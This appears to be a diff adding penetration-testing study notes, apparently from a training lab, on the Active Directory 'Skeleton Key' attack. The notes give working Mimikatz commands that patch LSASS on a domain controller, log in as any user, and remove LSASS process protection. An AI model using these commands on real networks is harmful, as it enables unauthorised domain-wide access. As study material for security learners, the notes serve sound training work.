@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Craft Skeleton Key</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Skeleton Key</h1></strong><br /><br /><strong><h2>## What is a Skeleton Key?</h2></strong><br />A skeleton key is a persistence technique where, with Domain Admin privileges, you patch a Domain Controller (the LSASS process) to allow access to it as any user with a single password.<br /><br />• Discovered by Dell Secureworks in a piece of malware named Skeleton Key.<br />• NOT persistent across reboots because it kills the LSASS process (at least the publicly known methods aren&#39;t)<br />• If skeleton key is already patched, you can&#39;t do it again - will see a <code>second pattern not found</code> error<br /><br /><strong><h2>## What can a Skeleton Key be used for?</h2></strong><br />Access any machine with a valid username + your own set password<br /><br /><div class="codebox"><div class="codebox">#&nbsp;With&nbsp;Domain&nbsp;Admin&nbsp;privileges,&nbsp;inject&nbsp;a&nbsp;Skeleton&nbsp;Key&nbsp;on&nbsp;a&nbsp;Domain&nbsp;Controller&nbsp;(password&nbsp;would&nbsp;be&nbsp;&quot;mimikatz&quot;&nbsp;-&gt;&nbsp;change&nbsp;this!)<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;privilege::debug&quot;&nbsp;&quot;misc::skeleton&quot;&#39;&nbsp;-ComputerName&nbsp;domain-controller.dollarcorp.moneycorp.local<br /><br />#&nbsp;Now&nbsp;it&#39;s&nbsp;possible&nbsp;to&nbsp;access&nbsp;any&nbsp;machine&nbsp;with&nbsp;a&nbsp;valid&nbsp;username&nbsp;+&nbsp;&quot;mimikatz&quot;&nbsp;password<br />Enter-PSSession&nbsp;-ComputerName&nbsp;dcorp-dc&nbsp;-Credential&nbsp;dcorp\Administrator&nbsp;</div></div><br /><br /><strong><h2>## Bypass LSASS Protected Processes</h2></strong><br />If LSASS is running as a protected process,<br />mimikatz needs to drop its driver (<code>mimidriv.sys</code>) onto the disk of the target domain controller.<br />This is VERY NOISY IN LOGS because you&#39;re dropping a Kernel driver.<br /><br /><code>mimikatz # privilege::debug <br />mimikatz # !+<br />mimikatz # !processprotect /process:lsass.exe /remove<br />mimikatz # misc::skeleton<br />mimikatz # !-</code></div>
+</body>
+</html>
